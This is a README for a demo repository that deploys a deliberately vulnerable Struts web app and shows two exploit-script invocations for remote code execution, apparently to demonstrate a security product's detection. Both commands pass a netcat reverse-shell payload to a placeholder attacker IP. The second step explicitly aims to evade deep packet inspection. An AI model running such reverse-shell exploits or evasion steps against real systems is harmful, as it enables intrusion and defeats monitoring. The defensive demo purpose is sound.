# struts-demo

Scripts for struts RCE demo and yaml file to deploy vulnerable container running struts super-app tomcat website.

## Prep

We will be using a struts RCE demo application.

It can be installed via Helm from the `helm/struts-rce` directory or simply adding this git repository to the Rancher Catalog and deploy the struts-rce application.

Alternate deployment file (struts.yaml) is available in the current directory and use a Load Balancer to expose the application.

## Exploit

Use the Ingress name of the website or Load Balancer IP with the python scripts to exploit a remote code execution vulnerability in the struts container.

Use the struts1.py first (insert your own IP addresses for the website and the reverse shell using 1337 (LEET) port address.
```
python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 'nc -nv 123.456.789.100 1337 -e /bin/sh'
```

Exploit should be blocked and alerts appear in Notifications->Security Events.

Then use the struts-pwn2.py script to avoid DPI threat detection.
```
python3 struts-pwn2.py --exploit --url 'http://xxx.xxx.xxx.xxx:8080/super-app/orders/3' -c 'nc -nv 123.456.789.100 1337 -e /bin/sh'
```
